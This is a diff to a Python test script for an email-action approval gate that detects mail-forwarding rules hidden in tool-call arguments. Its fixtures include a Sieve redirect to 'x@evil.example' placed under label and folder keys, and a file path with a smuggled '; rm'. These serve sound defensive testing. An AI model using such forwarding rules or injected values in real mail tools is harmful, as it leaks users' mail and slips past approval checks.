@@ -146,6 +146,19 @@ def has_text(ti):
                ("body", "text", "html", "htmlBody", "message", "subject", "content", "forwardText"))
 
 
+def attempt(fn):
+    """Run one probe; a missing function or a crash is a failed check (RED), not an aborted run."""
+    try:
+        return fn()
+    except Exception as exc:
+        return f"{type(exc).__name__}: {exc}"
+
+
+def mk_ex(inert=(), name=(), file=()):
+    """A tool-class exemption: normalised key names, as _has_forward_key_name takes it (card ea9215f6)."""
+    return {"inert": frozenset(inert), "name": frozenset(name), "file": frozenset(file)}
+
+
 with tempfile.TemporaryDirectory(prefix="mta-") as td:
     os.environ["EMAIL_APPROVAL_GATE_STORE"] = make_store(os.path.join(td, "inproc"), 2)
     os.environ["OUTGOING_COPY_GATE_RULES"] = os.path.join(os.environ["EMAIL_APPROVAL_GATE_STORE"], "rules.json")
@@ -228,10 +241,11 @@ with tempfile.TemporaryDirectory(prefix="mta-") as td:
     # card 61fcac1e: the narrow patterns are gone; these three, which they let through (a forward word with no address
     # near it, a forward word more than 40 characters from the address, `redirect` with no quoted address), now deny in
     # strict mode: any forward word counts. straightforward and label / folder identifiers stay out.
-    check("N4 B2 (61fcac1e): strict mode denies a bare forward word, a distant address and an unquoted redirect; straightforward and label / folder identifiers stay out",
+    # card ea9215f6: no key is inert for every tool any more; a label / folder identifier is word-tested unless a tool CLASS frees it.
+    check("N4 B2 (61fcac1e, ea9215f6): strict mode denies a bare forward word, a distant address and an unquoted redirect; straightforward stays out; a label / folder identifier has no exemption without a tool class",
           strict({"description": "forward looking statement, mail me at some point"}) and strict({"body": "forward " + "a" * 41 + " x@y.example"})
           and strict({"body": 'redirect x@y.example'}) and not strict({"body": "straightforward x@y.example"})
-          and not strict({"folder": "forward to x@evil.example"}) and not strict({"addLabelIds": ["fwd x@evil.example"]}))
+          and strict({"folder": "forward to x@evil.example"}) and strict({"addLabelIds": ["fwd x@evil.example"]}))
     check("N4 B2: plain draft vs rule / script / settings class",
           ee._is_plain_draft(["create_draft"], ["draft"]) and not ee._is_plain_draft(["update_settings"], ["draft"])
           and not ee._is_plain_draft(["manage_rules"], [None]) and not ee._is_plain_draft(["update_sieve_script"], ["draft"])
@@ -293,7 +307,7 @@ with tempfile.TemporaryDirectory(prefix="mta-") as td:
           and not ee._is_plain_draft(["create_draft"], [None])
           and ee._is_plain_draft(["server", "create_draft"], ["nonsend", "draft"])
           and not ee._is_plain_draft(["rules", "create_draft"], ["nonsend", "draft"]))
-    check("R1 B1: _is_label_folder_tool needs a label / folder noun AND a create / update / rename / add / move verb; a mailbox, a delete / get and a rule / settings / forward word are not",
+    check("R1 B1 (ea9215f6 T1): _is_label_folder_tool needs a label / folder noun AND a create / update / rename / add / move / delete / remove / modify verb, or a mailbox with create / rename / delete; a get, update_mailbox / set_mailbox and a rule / settings / forward word are not",
           all(ee._is_label_folder_tool([s]) for s in INV["label_segments"])
           and not any(ee._is_label_folder_tool([s]) for s in INV["not_label_segments"]))
     prose = {"to": ["known@example.com"], "subject": "Fwd: x", "body": "please forward this to x@y.example", "html": '<a href="mailto:x@y.example">x</a>'}
@@ -312,7 +326,8 @@ with tempfile.TemporaryDirectory(prefix="mta-") as td:
     check("T9 B2: attachment file names are exempt inside an attachment container of a plain draft only; a header value and a bare path / file key are not",
           all(not plain_mode(v) and strict(v) for v in files) and plain_mode({"headers": {"X-Tag": "fwd"}})
           and all(plain_mode(v) and strict(v) for v in bare))
-    label_mode = lambda v: ee._has_forward_key_name(v, True, True, True)
+    label_ex = mk_ex(name=("name", "displayname", "label", "labelname", "foldername", "title"))  # ea9215f6: the class exemption, passed in
+    label_mode = lambda v: ee._has_forward_key_name(v, True, True, label_ex)
     check("T9 B1: a label / folder tool frees only the name keys, every other key keeps the strict word test, the forward KEY test stays",
           not label_mode({"name": "Forwarded", "displayName": "Forwarded Items", "label": "Fwd", "labelName": "Fwd", "folderName": "Fwd", "title": "redirect"})
           and label_mode({"parameters": {"command": "set forwarding to x"}}) and label_mode({"name": "x", "action": "redirect"})
@@ -321,12 +336,17 @@ with tempfile.TemporaryDirectory(prefix="mta-") as td:
     check("T9 mailto: is a forward sign in strict mode only (outside the inert keys)",
           strict({"html": '<a href="mailto:a@b.hu">a</a>'}) and not plain_mode({"html": '<a href="mailto:a@b.hu">a</a>'})
           and strict({"x": "mailto:a@b.hu"}) and not plain_mode({"x": "mailto:a@b.hu"})
-          and not strict({"signature": "mailto:a@b.hu", "query": "mailto:"}) and strict({"path": "mailto:a@b.hu"}))
+          and not ee._has_forward_key_name({"signature": "mailto:a@b.hu", "query": "mailto:"}, True, True, mk_ex(inert=("signature", "query")))
+          and strict({"path": "mailto:a@b.hu"}))
     inert = {"query": "subject:Fwd", "q": "forward", "search": "Fwd", "keyword": "redirect", "keywords": ["forward"], "signature": "fwd",
              "responseBodyPlainText": "look forward", "responseBodyHtml": "forward", "internalReplyMessage": "forward",
              "externalReplyMessage": "redirect", "autoReplyMessage": "fwd", "label": "Forwarded", "folder": "Forwarded Items", "mailbox": "Forwarded"}
-    check("T9 inert keys are never word-tested; a forwarding KEY under an inert or prose key is a forward in every mode",
-          not strict(inert) and not plain_mode(inert) and strict({"query": '{"forwardTo":"x"}'}) and plain_mode({"signature": {"forwardTo": "x"}})
+    all_ex = mk_ex(inert=("query", "q", "search", "keyword", "keywords", "signature", "responsebodyplaintext", "responsebodyhtml",
+                          "internalreplymessage", "externalreplymessage", "autoreplymessage"),
+                   name=("label", "folder", "mailbox"))  # ea9215f6: the keys are inert only where a tool class lists them
+    check("T9 the keys a tool class lists are never word-tested (name keys: for a name-shaped value); a forwarding KEY under an inert or prose key is a forward in every mode",
+          not ee._has_forward_key_name(inert, True, True, all_ex) and not ee._has_forward_key_name(inert, True, False, all_ex)
+          and ee._has_forward_key_name({"query": '{"forwardTo":"x"}'}, True, True, all_ex) and plain_mode({"signature": {"forwardTo": "x"}})
           and plain_mode({"responseBodyPlainText": '{"redirectTo":"x"}'}))
     deep_v = {"a": 1}
     for _ in range(40):
@@ -335,6 +355,79 @@ with tempfile.TemporaryDirectory(prefix="mta-") as td:
           all(m(deep_v) and m({"l": list(range(6000))}) and m({"b": "{" + "a" * 100001}) and m("x") for m in (strict, plain_mode)))
     check("AC9: _has_forward_key counts mailto: as a forward sign", ee._has_forward_key({"action": {"notify": "mailto:"}}) is True
           and ee._has_forward_key({"criteria": {"subject": "invoice"}}) is False)
+
+    # --- 1d. card ea9215f6 N1: every exemption belongs to a tool class ----------
+    # 61fcac1e left a GLOBAL inert key set (label, folder, query, signature, ...): the be-n4r2 Sieve forms passed under those
+    # keys on the Sieve / rule / settings tools. Now _has_forward_key_name takes the exemption from the caller (`ex`, three
+    # key sets: inert always, name for a name-shaped value, file for a file-name-shaped value; none without it), the tool NAME
+    # picks the class (_exemption_class), the name and file values must have their shape, and a plain draft is a positive grammar.
+    # These checks are written ahead of the implementation (RED on 89ab0c72); the JS twin runs the same fixture rows in
+    # src/__tests__/mail-tool-action-conformance.test.ts.
+    print("class-bound exemptions")
+    EXS = INV["exemption_segments"]
+    got = [attempt(lambda r=r: ee._exemption_class(r["segments"], r["plain"])) for r in EXS]
+    bad = [f"{r['segments']}: {g!r} != {r['expected']!r}" for r, g in zip(EXS, got) if g != r["expected"]]
+    check(f"T2: _exemption_class names the class of {len(EXS)} tool-segment rows (plain, label, label-apply, move, msgop, reply, none)",
+          len(EXS) >= 20 and {r["expected"] for r in EXS} == {"plain", "label", "label-apply", "move", "msgop", "reply", "none"} and not bad,
+          f"{len(bad)} differ: {bad[:3]}")
+
+    SC = INV["shape_cases"]
+    got_n = attempt(lambda: [ee._NAME_SHAPE.fullmatch(c["value"]) is not None for c in SC])
+    got_f = attempt(lambda: [ee._FILE_SHAPE.fullmatch(c["value"]) is not None for c in SC])
+    check(f"T6: _NAME_SHAPE (a folder / label name, no @) matches the fixture on {len(SC)} values",
+          got_n == [c["name"] for c in SC], f"{got_n!r}"[:200])
+    check(f"T6: _FILE_SHAPE (a file name with a 1-10 character extension) matches the fixture on {len(SC)} values",
+          got_f == [c["file"] for c in SC], f"{got_f!r}"[:200])
+
+    forms = {f["label"]: f["text"] for f in INV["sieve_forms"]}
+    reloc = [(t, {"name": "main", k: forms[fl]}, f"{t.split('__')[2]}/{k}/{fl}")
+             for t in INV["relocation_tools"] for k in INV["relocation_keys"] for fl in INV["relocation_forms"]]
+    reloc += [(r["tool"], dict(r["fixed"], **{r["key"]: forms[r["form"]]}), f"{r['tool'].split('__')[2]}/{r['key']}/{r['form']}")
+              for r in INV["relocation_shape_rows"]]
+    bad = [lab for t, i, lab in reloc if ee.mail_tool_action(t, i) != "send" or ee.mail_rule_forward(t, i) is not True]
+    check(f"T5: {len(reloc)} calls (Sieve forms moved under the formerly global inert keys of the Sieve / rule / filter / B5 tools, "
+          "and a form as a folder name) are a send and a rule-forward",
+          len(reloc) == len(INV["relocation_tools"]) * len(INV["relocation_keys"]) * len(INV["relocation_forms"]) + len(INV["relocation_shape_rows"])
+          and not bad, f"{len(bad)} differ: {bad[:5]}")
+
+    # T7: _has_forward_key_name with the new `ex` argument
+    no_ex = attempt(lambda: all(ee._has_forward_key_name(v, True, st) is True for st in (True, False) for v in (
+        {"query": "fwd"}, {"signature": "fwd"}, {"label": "Forwarded"}, {"folder": "Forwarded Items"}, {"mailbox": "Fwd"},
+        {"destination": "Forwarded"}, {"filePath": "/tmp/Fwd_ajanlat.pdf"}))
+        and ee._has_forward_key_name({"responseBodyPlainText": "look forward", "autoReplyMessage": "fwd"}, True, True) is True)
+    check("T7: without an `ex` argument no key is exempt (query, signature, label, folder, mailbox, destination, filePath; the reply text keys in strict mode)", no_ex is True, f"{no_ex!r}")
+    hk7 = lambda v, st, ex: ee._has_forward_key_name(v, True, st, ex)
+    inert_ex = mk_ex(inert=("query", "signature"))
+    check("T7: an inert key is never word-tested, in either mode; only the listed keys",
+          attempt(lambda: not hk7({"query": "subject:Fwd", "signature": "mailto:a@b.hu"}, True, inert_ex)
+                  and not hk7({"query": "subject:Fwd"}, False, inert_ex)
+                  and hk7({"q": "fwd"}, True, inert_ex) and hk7({"label": "Forwarded"}, True, inert_ex)
+                  and hk7({"query": '{"forwardTo":"x"}'}, True, inert_ex)) is True)
+    name_ex = mk_ex(name=("label", "folder", "name", "title"))
+    check("T7: a name key frees a folder-name-shaped value (a list too); a Sieve command, a ; : \" or an @ value, other keys and a forward KEY still deny",
+          attempt(lambda: not hk7({"label": "Forwarded", "folder": "Forwarded Items", "name": "Fwd", "title": "redirect"}, True, name_ex)
+                  and not hk7({"label": ["Forwarded", "Fwd"]}, True, name_ex)
+                  and hk7({"label": 'redirect :copy "x@evil.example";'}, True, name_ex) and hk7({"label": "forward to x@evil.example"}, True, name_ex)
+                  and hk7({"folder": "Forwarded;"}, True, name_ex) and hk7({"label": ["Forwarded", "redirect;"]}, True, name_ex)
+                  and hk7({"description": "Forwarded"}, True, name_ex) and hk7({"other": "Forwarded"}, True, name_ex)
+                  and hk7({"label": {"forwardTo": "a"}}, True, name_ex)) is True)
+    file_ex = mk_ex(file=("filepath", "attachmentpaths"))
+    check("T7: a file key frees a file-name-shaped value in both modes; /forwardTo, a value with no extension and other file keys still deny",
+          attempt(lambda: not hk7({"filePath": "/tmp/Fwd_ajanlat.pdf"}, True, file_ex) and not hk7({"filePath": "/tmp/Fwd_ajanlat.pdf"}, False, file_ex)
+                  and not hk7({"attachmentPaths": ["/tmp/Fwd_ajanlat.pdf", "fwd.pdf"]}, True, file_ex)
+                  and hk7({"filePath": "/forwardTo"}, True, file_ex) and hk7({"attachmentPaths": ["/tmp/ok.pdf", "/forwardTo"]}, True, file_ex)
+                  and hk7({"fileName": "Fwd_invoice.pdf"}, True, file_ex) and hk7({"filePath": "fwd.pdf; rm"}, True, file_ex)) is True)
+    all3 = mk_ex(inert=("a",), name=("b",), file=("c",))
+
+    def deep_nest():
+        d = {"a": 1}
+        for _ in range(40):
+            d = {"n": d}
+        return d
+    check("T7: a forwarding KEY under every exempt key set, and the bounds (depth, node count, string length, non-container), deny whatever `ex` says",
+          attempt(lambda: all(hk7({k: {"forwardTo": "x"}}, st, all3) and hk7({k: {"redirectTo": 1}}, st, all3) for k in ("a", "b", "c") for st in (True, False))
+                  and all(hk7(v, st, all3) for st in (True, False) for v in (
+                      deep_nest(), {"l": list(range(6000))}, {"b": "{" + "a" * 100001}, "x", None))) is True)
     # the main agent's gates, measured on a disposable store (card 3d6e5181 N3, R5): the approval gate
     # puts a forwarding rule behind the autonomy level (level 1 denies, level 3 passes, like any send), a
     # reader and a clean rule pass; the copy gate has no text to inspect on a rule, so it denies a forwarding
